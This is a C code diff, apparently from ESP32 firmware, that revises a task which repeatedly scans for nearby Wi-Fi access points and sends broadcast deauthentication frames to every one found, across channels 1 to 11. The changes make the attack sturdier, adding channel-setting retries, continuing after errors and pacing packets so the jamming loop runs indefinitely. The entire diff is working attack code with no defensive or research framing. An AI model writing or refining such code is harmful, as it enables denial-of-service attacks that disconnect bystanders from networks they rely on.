@@ -1636,7 +1636,6 @@ void wifi_auto_deauth_task(void* Parameter)
 {
     while (1)
     {
-
         wifi_scan_config_t scan_config = {
             .ssid = NULL,
             .bssid = NULL,
@@ -1645,10 +1644,7 @@ void wifi_auto_deauth_task(void* Parameter)
         };
 
         ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
-
-
         vTaskDelay(pdMS_TO_TICKS(1500));
-
         esp_wifi_scan_stop();
 
         ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
@@ -1657,14 +1653,15 @@ void wifi_auto_deauth_task(void* Parameter)
             scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
             if (scanned_aps == NULL) {
                 printf("Failed to allocate memory for AP info\n");
-                return;
+                continue;
             }
 
             ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
-
             printf("Found %d access points\n", ap_count);
         } else {
             printf("No access points found\n");
+            vTaskDelay(pdMS_TO_TICKS(1000));  // Wait before retrying if no APs found
+            continue;
         }
 
         wifi_ap_record_t *ap_info = scanned_aps;
@@ -1673,20 +1670,37 @@ void wifi_auto_deauth_task(void* Parameter)
             return;
         }
 
-        for (int z = 0; z < 50; z++)
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                for (int y = 1; y < 12; y++)
-                {
+        for (int z = 0; z < 50; z++) {
+            for (int i = 0; i < ap_count; i++) {
+                for (int y = 1; y < 12; y++) {
+                    int retry_count = 0;
+                    esp_err_t err;
+                    while (retry_count < 3) {
+                        err = esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
+                        if (err == ESP_OK) {
+                            break;
+                        }
+                        printf("Failed to set channel %d, retry %d\n", y, retry_count + 1);
+                        vTaskDelay(pdMS_TO_TICKS(50));  // 50ms delay between retries
+                        retry_count++;
+                    }
+
+                    if (err != ESP_OK) {
+                        printf("Failed to set channel after retries, skipping...\n");
+                        continue;  // Skip this channel if all retries failed
+                    }
+
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(10 / portTICK_PERIOD_MS);
+                    vTaskDelay(pdMS_TO_TICKS(25));  // 25ms delay between deauth packets
                 }
+                vTaskDelay(pdMS_TO_TICKS(50));  // 50ms delay between APs
             }
+            vTaskDelay(pdMS_TO_TICKS(100));  // 100ms delay between cycles
         }
 
         free(scanned_aps);
+        vTaskDelay(pdMS_TO_TICKS(1000));  // 1000ms delay before starting next scan
     }   
 }
 
